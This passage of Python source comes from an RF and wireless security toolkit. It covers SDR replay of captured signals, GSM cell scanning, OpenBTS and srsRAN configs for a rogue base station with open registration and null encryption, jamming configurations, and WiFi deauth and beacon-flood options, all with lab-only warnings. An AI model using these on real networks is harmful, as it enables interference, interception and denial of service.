        center_freq_hz: float,
        sample_rate: int | None = None,
        gain: int | None = None,
        repeat: int = 1,
    ) -> RFResult:
        """
        Replay (transmit) previously captured IQ samples.

        WARNING: RF transmission. Ensure proper authorization and licensing.

        Args:
            input_file: IQ capture file path.
            center_freq_hz: Transmit frequency in Hz.
            sample_rate: Sample rate.
            gain: TX gain.
            repeat: Number of times to replay (0 = infinite).

        Returns:
            RFResult with operation status.
        """
        if self.backend == SDRBackend.RTLSDR:
            return RFResult(success=False, error="RTL-SDR is receive-only, cannot transmit")

        sr = sample_rate or self.sample_rate
        g = gain or self.gain

        logger.info(
            f"Replaying IQ: {input_file} → {center_freq_hz/1e6:.3f} MHz "
            f"(rate={sr/1e6:.1f} MS/s, gain={g} dB)"
        )
        logger.warning("RF TRANSMISSION ACTIVE — ensure authorization!")

        if self.backend == SDRBackend.HACKRF:
            cmd = [
                "hackrf_transfer",
                "-t", input_file,
                "-f", str(int(center_freq_hz)),
                "-s", str(sr),
                "-x", str(g),
            ]
            if repeat != 1:
                cmd.extend(["-R"])  # HackRF repeat flag
        else:
            cmd = [
                "tx_sdr",
                "-f", str(int(center_freq_hz)),
                "-s", str(sr),
                "-g", str(g),
                input_file,
            ]

        stdout, stderr, rc = RFEnvironment.run_cmd(cmd, timeout=300)

        return RFResult(
            success=rc == 0,
            domain=RFDomain.SDR,
            data={"file": input_file, "freq_hz": center_freq_hz, "stdout": stdout},
            error=stderr if rc != 0 else None,
        )

    def spectrum_sweep(
        self,
        freq_start_hz: float,
        freq_end_hz: float,
        output_file: str = "/tmp/sweep.csv",
        bin_width: int = 100_000,
    ) -> RFResult:
        """
        Perform a wideband spectrum sweep.

        Uses hackrf_sweep or rtl_power for spectrum analysis.

        Args:
            freq_start_hz: Start frequency.
            freq_end_hz: End frequency.
            output_file: Output CSV file.
            bin_width: FFT bin width in Hz.

        Returns:
            RFResult with sweep data.
        """
        logger.info(
            f"Spectrum sweep: {freq_start_hz/1e6:.1f} - {freq_end_hz/1e6:.1f} MHz"
        )

        if self.backend == SDRBackend.HACKRF:
            cmd = [
                "hackrf_sweep",
                "-f", f"{int(freq_start_hz/1e6)}:{int(freq_end_hz/1e6)}",
                "-w", str(bin_width),
                "-r", output_file,
                "-n", "8192",
            ]
        elif self.backend == SDRBackend.RTLSDR:
            cmd = [
                "rtl_power",
                "-f", f"{int(freq_start_hz)}:{int(freq_end_hz)}:{bin_width}",
                "-g", str(self.gain),
                output_file,
            ]
        else:
            return RFResult(success=False, error=f"Sweep not supported for {self.backend}")

        # Run for a few seconds
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(self.options.get("sweep_duration", 10))
        proc.terminate()
        proc.wait()

        return RFResult(
            success=os.path.exists(output_file),
            domain=RFDomain.SDR,
            data={"output_file": output_file, "range_mhz": f"{freq_start_hz/1e6}-{freq_end_hz/1e6}"},
        )


# ══════════════════════════════════════════════
#  CELLULAR / TELECOM OPERATIONS
# ══════════════════════════════════════════════

class CellularOperations:
    """
    Cellular network security research operations.

    Supports:
        - GSM (OpenBTS, OsmocomBB, gr-gsm)
        - LTE/4G (srsRAN)
        - 5G NR (srsRAN Project, Open5GS)

    IMPORTANT: Cellular transmission requires RF shielding (Faraday cage)
    or proper licensing. Operating a rogue BTS without authorization
    is illegal in most jurisdictions.
    """

    def __init__(self, tech: CellularTech = CellularTech.LTE_4G, options: dict | None = None):
        self.tech = tech
        self.options = options or {}

    # ── GSM / OpenBTS ─────────────────────────

    @staticmethod
    def scan_gsm_cells(
        band: str = "GSM900",
        sdr_backend: SDRBackend = SDRBackend.RTLSDR,
        duration: int = 30,
    ) -> list[dict]:
        """
        Scan for GSM base stations using kalibrate or grgsm_scanner.

        Args:
            band: GSM band (GSM900, GSM1800, etc.)
            sdr_backend: SDR backend to use.
            duration: Scan duration.

        Returns:
            List of discovered cells with ARFCN, freq, and power.
        """
        cells = []

        # Try kalibrate-hackrf / kalibrate-rtl first
        kal_tool = f"kalibrate-{'hackrf' if sdr_backend == SDRBackend.HACKRF else 'rtl'}"
        if not RFEnvironment.check_tool(kal_tool):
            kal_tool = "kal"  # Fallback name

        stdout, stderr, rc = RFEnvironment.run_cmd(
            [kal_tool, "-s", band], timeout=duration + 30
        )

        if rc == 0:
            for line in stdout.split("\n"):
                # Parse: chan: 50 (940.0MHz + 10.449kHz) power: 312345.67
                match = re.search(
                    r"chan:\s*(\d+)\s*\(([0-9.]+)MHz.*?\)\s*power:\s*([0-9.]+)",
                    line
                )
                if match:
                    cells.append({
                        "arfcn": int(match.group(1)),
                        "frequency_mhz": float(match.group(2)),
                        "power": float(match.group(3)),
                        "band": band,
                    })
        else:
            logger.warning(f"GSM scan failed: {stderr}")

        logger.info(f"Found {len(cells)} GSM cells on {band}")
        return cells

    @staticmethod
    def decode_gsm_broadcast(
        arfcn: int,
        duration: int = 30,
        output_file: str = "/tmp/gsm_capture.bursts",
    ) -> RFResult:
        """
        Capture and decode GSM broadcast channels using gr-gsm.

        Captures System Information messages (SI) which contain:
        - MCC/MNC (operator identity)
        - LAC (Location Area Code)
        - Cell ID
        - Neighbor cell list
        - Channel configuration

        Args:
            arfcn: GSM ARFCN to capture.
            duration: Capture duration.
            output_file: Output file for captured bursts.

        Returns:
            RFResult with decoded cell information.
        """
        logger.info(f"Decoding GSM broadcast on ARFCN {arfcn}...")

        # Use grgsm_livemon to capture and decode
        cmd = ["grgsm_livemon", "-a", str(arfcn)]

        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        time.sleep(duration)
        proc.terminate()
        stdout, _ = proc.communicate(timeout=10)

        return RFResult(
            success=True,
            domain=RFDomain.CELLULAR,
            data={
                "arfcn": arfcn,
                "output": stdout.decode(errors="replace") if stdout else "",
            },
        )

    @staticmethod
    def generate_openbts_config(
        mcc: str = "001",
        mnc: str = "01",
        band: str = "GSM900",
        arfcn: int = 50,
        lac: int = 1000,
        ci: int = 1,
        shortname: str = "ResearchLab",
        open_registration: bool = True,
    ) -> str:
        """
        Generate OpenBTS configuration for lab GSM network.

        This creates a minimal config for running a GSM BTS in a
        shielded lab environment (Faraday cage required).

        Args:
            mcc: Mobile Country Code (001 = Test)
            mnc: Mobile Network Code (01 = Test)
            band: GSM frequency band
            arfcn: Channel number
            lac: Location Area Code
            ci: Cell Identity
            shortname: Network short name
            open_registration: Allow any SIM to register

        Returns:
            OpenBTS configuration as string.
        """
        config = f"""# OpenBTS Configuration - Security Research Lab
# WARNING: RF shielded environment required!
#
# MCC/MNC 001/01 = Test Network (ITU allocated)
# Ensure Faraday cage is active before powering BTS

# ── Identity ──
GSM.Identity.MCC {mcc}
GSM.Identity.MNC {mnc}
GSM.Identity.ShortName {shortname}
GSM.Identity.LAC {lac}
GSM.Identity.CI {ci}

# ── Radio ──
GSM.Radio.Band {band}
GSM.Radio.C0 {arfcn}
GSM.Radio.PowerManager.MaxAttenDB 30
GSM.Radio.PowerManager.MinAttenDB 30
GSM.Radio.RxGain 52

# ── Registration ──
{"Control.LUR.OpenRegistration .*" if open_registration else "# Closed registration - add IMSIs manually"}
Control.LUR.FailMode ACCEPT

# ── Channels ──
GSM.Channels.NumC1s 7
GSM.Channels.NumC7s 0

# ── SIP (Asterisk integration) ──
SIP.Local.IP 127.0.0.1
SIP.Local.Port 5062
SIP.Proxy.Address 127.0.0.1
SIP.Proxy.Port 5060

# ── SMS ──
SIP.SMSC 0000
"""
        return config

    # ── LTE / srsRAN ──────────────────────────

    @staticmethod
    def generate_srsran_enb_config(
        mcc: str = "001",
        mnc: str = "01",
        band: int = 7,
        earfcn: int = 3350,
        n_prb: int = 50,
        tx_gain: float = 80.0,
        rx_gain: float = 40.0,
        device_name: str = "auto",
        device_args: str = "auto",
        tac: int = 7,
        enb_id: int = 0x19B,
        mme_addr: str = "127.0.1.100",
    ) -> dict[str, str]:
        """
        Generate srsRAN eNB (4G base station) configuration files.

        Creates configs for running a complete LTE network:
        - enb.conf (eNodeB configuration)
        - rr.conf  (Radio Resource configuration)
        - sib.conf (System Information Blocks)
        - drb.conf (Data Radio Bearers)

        Args:
            mcc/mnc: PLMN identity (001/01 = test)
            band: LTE band number
            earfcn: E-UTRA ARFCN
            n_prb: Number of PRBs (6, 15, 25, 50, 75, 100)
            tx_gain/rx_gain: SDR gain settings
            device_name: SDR device (auto, UHD, bladeRF, soapy)
            tac: Tracking Area Code
            enb_id: eNB identifier
            mme_addr: MME/EPC address

        Returns:
            Dict of config filename → config content.
        """
        enb_conf = f"""#####################################################################
#                   srsRAN eNB Configuration
#                   Security Research Lab
#####################################################################
# WARNING: Operate in RF shielded environment only!
# Band {band} ({LTE_BANDS.get(band, {}).get('name', 'Unknown')})

[enb]
enb_id = 0x{enb_id:04x}
mcc = {mcc}
mnc = {mnc}
mme_addr = {mme_addr}
gtp_bind_addr = 127.0.1.1
s1c_bind_addr = 127.0.1.1
s1c_bind_port = 0
n_prb = {n_prb}

[enb_files]
sib_config = sib.conf
rr_config  = rr.conf
drb_config = drb.conf

[rf]
dl_earfcn = {earfcn}
tx_gain = {tx_gain}
rx_gain = {rx_gain}
device_name = {device_name}
device_args = {device_args}
#time_adv_nsamples = auto

[log]
all_level = info
all_hex_limit = 32
filename = /tmp/enb.log
file_max_size = -1
"""

        epc_conf = f"""#####################################################################
#                   srsRAN EPC Configuration
#                   Security Research Lab
#####################################################################

[mme]
mme_code = 0x1a
mme_group = 0x0001
tac = {tac}
mcc = {mcc}
mnc = {mnc}
mme_bind_addr = {mme_addr}
apn = srsapn
dns_addr = 8.8.8.8
encryption_algo = EEA0
integrity_algo = EIA1
paging_timer = 2

[hss]
db_file = user_db.csv

[spgw]
gtpu_bind_addr   = 172.16.0.1
sgi_if_addr      = 172.16.0.1
sgi_if_name      = srs_spgw_sgi

[log]
all_level = info
all_hex_limit = 32
filename = /tmp/epc.log
"""

        user_db = f"""#
# .csv to store UE's information in HSS
# Kept in the following format:
#
# Name,Auth,IMSI,Key,OP_Type,OP/OPc,AMF,SQN,QCI,IP_alloc
#
ue1,mil,001010123456789,00112233445566778899aabbccddeeff,opc,63bfa50ee6523365ff14c1f45f88737d,8000,000000001234,9,dynamic
"""

        rr_conf = f"""// Radio Resource Configuration
// srsRAN - Security Research Lab

cell_list =
(
  {{
    rf_port = 0;
    cell_id = 0x01;
    tac = {tac};
    pci = 1;
    dl_earfcn = {earfcn};
    ho_active = false;

    // CA cells (if applicable)
    scell_list = (
    )
  }}
);
"""

        return {
            "enb.conf": enb_conf,
            "epc.conf": epc_conf,
            "user_db.csv": user_db,
            "rr.conf": rr_conf,
        }

    @staticmethod
    def generate_srsran_5g_config(
        mcc: str = "001",
        mnc: str = "01",
        band: int = 41,
        scs_khz: int = 15,
        bandwidth_mhz: int = 10,
        device: str = "auto",
    ) -> dict[str, str]:
        """
        Generate srsRAN Project 5G gNB + core configuration.

        For srsRAN Project (new 5G stack, separate from srsRAN 4G).

        Args:
            mcc/mnc: PLMN
            band: NR band (e.g., n41, n78)
            scs_khz: Subcarrier spacing (15, 30, 60 kHz)
            bandwidth_mhz: Channel bandwidth
            device: SDR device

        Returns:
            Dict of config filename → config content.
        """
        gnb_conf = f"""# srsRAN Project gNB Configuration
# Security Research Lab - 5G NR
# Band n{band}, SCS={scs_khz} kHz, BW={bandwidth_mhz} MHz

amf:
  addr: 127.0.0.1
  bind_addr: 127.0.0.1

ru_sdr:
  device_driver: {device}
  device_args: auto
  srate: {bandwidth_mhz * 2}e6
  tx_gain: 50
  rx_gain: 40

cell_cfg:
  dl_arfcn: 520002
  band: {band}
  channel_bandwidth_MHz: {bandwidth_mhz}
  common_scs: {scs_khz}
  plmn: \"{mcc}{mnc}\"
  tac: 7
  pci: 1
  nof_antennas_dl: 1
  nof_antennas_ul: 1

log:
  filename: /tmp/gnb.log
  all_level: info
"""

        core_conf = f"""# Open5GS Minimal Configuration for srsRAN 5G Lab
# Adjust paths as needed for your Open5GS installation

amf:
  plmn_id:
    mcc: \"{mcc}\"
    mnc: \"{mnc}\"
  tac: 7
  s_nssai:
    - sst: 1

upf:
  subnet:
    - addr: 10.45.0.1/16
"""

        return {
            "gnb.yml": gnb_conf,
            "core_notes.yml": core_conf,
        }

    # ── RF Jamming (Authorized Lab Only) ──────

    @staticmethod
    def generate_jamming_config(
        center_freq_hz: float,
        bandwidth_hz: float = 1_000_000,
        method: str = "noise",
        power_dbm: float = -10.0,
        sdr_backend: SDRBackend = SDRBackend.HACKRF,
    ) -> dict:
        """
        Generate RF jamming configuration for lab testing.

        CRITICAL: Only for use in RF-shielded environments (Faraday cage).
        RF jamming is illegal outside of authorized, shielded labs.

        Methods:
            - noise:    Broadband noise (most effective, least selective)
            - tone:     Single-tone CW (narrowband)
            - sweep:    Frequency sweep across band
            - protocol: Protocol-aware jamming (e.g., pilot tone targeting)

        Args:
            center_freq_hz: Target center frequency.
            bandwidth_hz: Jamming bandwidth.
            method: Jamming method.
            power_dbm: Transmit power (keep LOW in lab).
            sdr_backend: SDR to use for transmission.

        Returns:
            Config dict with parameters and GRC flowgraph hints.
        """
        config = {
            "center_freq_hz": center_freq_hz,
            "center_freq_mhz": center_freq_hz / 1e6,
            "bandwidth_hz": bandwidth_hz,
            "method": method,
            "power_dbm": power_dbm,
            "sdr_backend": sdr_backend.value,
            "sample_rate": max(int(bandwidth_hz * 2.5), 2_000_000),
            "safety": {
                "faraday_cage_required": True,
                "max_power_dbm": 0,
                "auto_shutoff_sec": 60,
            },
            "gnuradio_blocks": {},
        }

        if method == "noise":
            config["gnuradio_blocks"] = {
                "source": "analog.noise_source_c(analog.GR_GAUSSIAN, amplitude=0.5)",
                "filter": f"filter.firdes.low_pass(1, {config['sample_rate']}, "
                          f"{int(bandwidth_hz/2)}, {int(bandwidth_hz/10)})",
                "sink": f"osmosdr.sink(args='hackrf=0')",
                "notes": "Gaussian noise → band-pass filter → SDR TX",
            }
        elif method == "tone":
            config["gnuradio_blocks"] = {
                "source": f"analog.sig_source_c({config['sample_rate']}, "
                          f"analog.GR_COS_WAVE, 0, 0.8, 0)",
                "sink": f"osmosdr.sink(args='hackrf=0')",
                "notes": "Single CW tone at center frequency",
            }
        elif method == "sweep":
            config["gnuradio_blocks"] = {
                "source": "analog.sig_source_c with VCO sweep",
                "sweep_rate_hz_per_sec": bandwidth_hz * 10,
                "notes": "Swept tone across bandwidth",
            }

        return config


# ══════════════════════════════════════════════
#  RF TOOL BASE CLASS
# ══════════════════════════════════════════════

class RFToolBase(ABC):
    """
    Abstract base class for RF security tools.

    Provides:
    - Environment checks
    - Hardware detection
    - Finding management
    - Standard execution lifecycle

    Subclasses must implement:
    - run() — Main tool logic
    """

    NAME: str = "RFTool"
    VERSION: str = "0.1.0"
    DOMAIN: RFDomain = RFDomain.RF_GENERAL
    DESCRIPTION: str = "RF security tool"
    REQUIRES_ROOT: bool = True

    def __init__(self, options: dict | None = None):
        self.options = options or {}
        self.findings: list[RFFinding] = []
        self.captures: list[RFCapture] = []
        self.targets: list[RFTarget] = []
        self.start_time: Optional[datetime] = None
        self.end_time: Optional[datetime] = None
        self._original_sigint = None

    def add_finding(
        self,
        title: str,
        severity: Severity,
        description: str,
        target: Optional[RFTarget] = None,
        evidence: str = "",
        capture: Optional[RFCapture] = None,
        remediation: str = "",
        **kwargs,
    ):
        """Add an RF security finding."""
        finding = RFFinding(
            title=title,
            severity=severity,
            domain=self.DOMAIN,
            description=description,
            target=target,
            evidence=evidence,
            capture=capture,
            remediation=remediation,
            **kwargs,
        )
        self.findings.append(finding)
        logger.info(f"[{severity.value}] {title}")

    def preflight_check(self) -> bool:
        """Run preflight checks before execution."""
        ok = True

        if self.REQUIRES_ROOT and not RFEnvironment.check_root():
            logger.error("Root privileges required. Run with sudo.")
            ok = False

        return ok

    @abstractmethod
    def run(self) -> RFResult:
        """Main tool logic. Must be implemented by subclasses."""
        pass

    def execute(self) -> RFResult:
        """Full execution lifecycle with safety controls."""
        self.start_time = datetime.now()

        print(f"\n{'='*60}")
        print(f" {self.NAME} v{self.VERSION}")
        print(f" {self.DESCRIPTION}")
        print(f" Domain: {self.DOMAIN.value}")
        print(f"{'='*60}")
        print(f" Started: {self.start_time.isoformat()}")
        print(f"{'='*60}\n")

        if not self.preflight_check():
            return RFResult(success=False, error="Preflight check failed")

        # Setup graceful Ctrl+C handling
        self._original_sigint = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, self._handle_interrupt)

        try:
            result = self.run()
        except KeyboardInterrupt:
            logger.warning("Operation interrupted by user")
            result = RFResult(success=False, error="Interrupted")
        except Exception as e:
            logger.error(f"Execution error: {e}")
            result = RFResult(success=False, error=str(e))
        finally:
            # Restore signal handler
            if self._original_sigint:
                signal.signal(signal.SIGINT, self._original_sigint)

        self.end_time = datetime.now()
        result.duration = (self.end_time - self.start_time).total_seconds()
        result.findings = self.findings
        result.captures = self.captures
        result.targets_found = self.targets

        self._print_summary(result)
        return result

    def _handle_interrupt(self, signum, frame):
        """Handle Ctrl+C gracefully."""
        logger.warning("\nInterrupt received. Cleaning up...")
        raise KeyboardInterrupt

    def _print_summary(self, result: RFResult):
        """Print execution summary."""
        print(f"\n{'='*60}")
        print(f" {self.NAME} Complete")
        print(f"{'='*60}")
        print(f" Duration:    {result.duration:.2f}s")
        print(f" Targets:     {len(result.targets_found)}")
        print(f" Captures:    {len(result.captures)}")
        print(f" Findings:    {len(result.findings)}")

        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            count = sum(1 for f in result.findings if f.severity.value == sev)
            if count > 0:
                print(f"   {sev}: {count}")

        print(f"{'='*60}\n")

    def to_json(self) -> str:
        """Export results as JSON."""
        return json.dumps({
            "tool": self.NAME,
            "version": self.VERSION,
            "domain": self.DOMAIN.value,
            "start_time": self.start_time.isoformat() if self.start_time else None,
            "end_time": self.end_time.isoformat() if self.end_time else None,
            "targets": [t.to_dict() for t in self.targets],
            "findings": [f.to_dict() for f in self.findings],
            "captures": [{"file": c.filepath, "format": c.format} for c in self.captures],
        }, indent=2)


# ══════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════

def create_rf_parser(tool_name: str, description: str) -> argparse.ArgumentParser:
    """Create argument parser for RF security tools."""
    parser = argparse.ArgumentParser(
        prog=tool_name,
        description=description,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # Domain selection
    parser.add_argument(
        "--domain",
        choices=["wifi", "cellular", "bluetooth", "sdr", "sub_ghz", "rfid_nfc"],
        default="wifi",
        help="RF domain (default: wifi)",
    )

    # WiFi options
    wifi_group = parser.add_argument_group("WiFi options")
    wifi_group.add_argument("-i", "--interface", help="Wireless interface")
    wifi_group.add_argument("--bssid", help="Target AP BSSID")
    wifi_group.add_argument("--ssid", help="Target SSID")
    wifi_group.add_argument("-ch", "--channel", type=int, default=0, help="Channel")
    wifi_group.add_argument(
        "--attack",
        choices=["deauth", "beacon_flood", "handshake", "pmkid", "scan"],
        help="WiFi attack type",
    )

    # SDR options
    sdr_group = parser.add_argument_group("SDR options")
    sdr_group.add_argument(
        "--sdr",
        choices=["hackrf", "rtlsdr", "bladerf", "usrp", "limesdr"],
        default="hackrf",
        help="SDR backend (default: hackrf)",
    )
    sdr_group.add_argument("--freq", type=float, help="Center frequency in MHz")
    sdr_group.add_argument("--sample-rate", type=int, default=2000000, help="Sample rate")
    sdr_group.add_argument("--gain", type=int, default=40, help="Gain (dB)")

    # Cellular options
    cell_group = parser.add_argument_group("Cellular options")
    cell_group.add_argument(
        "--tech",
        choices=["gsm", "lte", "5g"],
        default="lte",
        help="Cellular technology",
    )
    cell_group.add_argument("--band", type=int, help="Cellular band number")
    cell_group.add_argument("--mcc", default="001", help="MCC (default: 001)")
    cell_group.add_argument("--mnc", default="01", help="MNC (default: 01)")

    # General
    general_group = parser.add_argument_group("general options")
    general_group.add_argument("--duration", type=int, default=30, help="Duration (seconds)")
    general_group.add_argument("-o", "--output", help="Output file")
    general_group.add_argument("-v", "--verbose", action="store_true", help="Verbose")
    general_group.add_argument(
        "--env-check",
        action="store_true",
        help="Run environment check and exit",
    )

    return parser


# ══════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════

if __name__ == "__main__":
    parser = create_rf_parser("rf_toolkit", "RF & Wireless Security Research Toolkit")
    args = parser.parse_args()

    # Environment check mode
    if args.env_check:
        RFEnvironment.print_environment_report()
        sys.exit(0)

    print("RF & Wireless Security Research Template")
    print("=" * 55)
    print()
    print("Domains & Classes:")
    print()
    print("  WiFi 802.11:")
    print("    WifiOperations     - deauth, beacon_flood, handshake, pmkid")
    print()
    print("  SDR:")
    print("    SDROperations      - capture_iq, replay_iq, spectrum_sweep")
    print()
    print("  Cellular:")
    print("    CellularOperations - gsm scan, openbts config, srsran config")
    print("                         srsran 5g config, jamming config")
    print()
    print("  Base Class:")
    print("    RFToolBase         - extend for custom RF tools")
    print()
    print("  Environment:")
    print("    RFEnvironment      - hardware detection, tool checks")
    print()
    print("Quick Start:")
    print("  python rf_wireless_template.py --env-check")
    print()
    print("Example: WiFi Deauth")
    print("  wifi = WifiOperations('wlan0mon')")
    print("  wifi.deauth(target_bssid='AA:BB:CC:DD:EE:FF', count=100)")
    print()
    print("Example: SDR IQ Capture")
    print("  sdr = SDROperations(SDRBackend.HACKRF)")
    print("  sdr.capture_iq(center_freq_hz=915e6, output_file='capture.iq')")
    print()
    print("Example: Generate srsRAN LTE Config")
    print("  configs = CellularOperations.generate_srsran_enb_config(band=7)")
    print("  for name, content in configs.items():")
    print("      print(f'--- {name} ---')")
    print("      print(content)")
    print()
    print("Example: Generate OpenBTS Config")
    print("  config = CellularOperations.generate_openbts_config(arfcn=50)")
    print("  print(config)")
